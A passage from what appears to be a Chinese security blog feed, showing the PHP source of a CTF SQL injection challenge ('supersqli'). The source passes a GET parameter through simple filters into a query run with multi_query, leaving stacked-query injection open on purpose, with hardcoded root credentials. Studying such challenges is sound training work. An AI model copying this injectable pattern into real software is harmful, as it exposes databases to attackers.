strstr($inject, &quot;prepare&quot;)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;inject&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waf1</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="title function_ invoke__">waf2</span>(<span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;supersqli&quot;</span>);</span><br><span class="line">    <span class="comment">//多条sql语句</span></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from `words` where id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">multi_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span>)&#123;<span class="comment">//使用multi_query()执行一条或多条sql语句</span></span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$rs</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">store_result</span>())&#123;<span class="comment">//store_result()方法获取第一条sql语句查询结果</span></span><br><span class="line">          <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">Close</span>(); <span class="comment">//关闭结果集</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">more_results</span>())&#123;  <span class="comment">//判断是否还有更多结果集</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">while</span>(<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">next_result</span>()); <span class="comment">//next_result()方法获取下一结果集，返回bool值</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error &quot;</span>.<span class="variable">$mysqli</span>-&gt;errno.<span class="string">&quot; : &quot;</span>.<span class="variable">$mysqli</span>-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();  <span class="comment">//关闭数据库连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
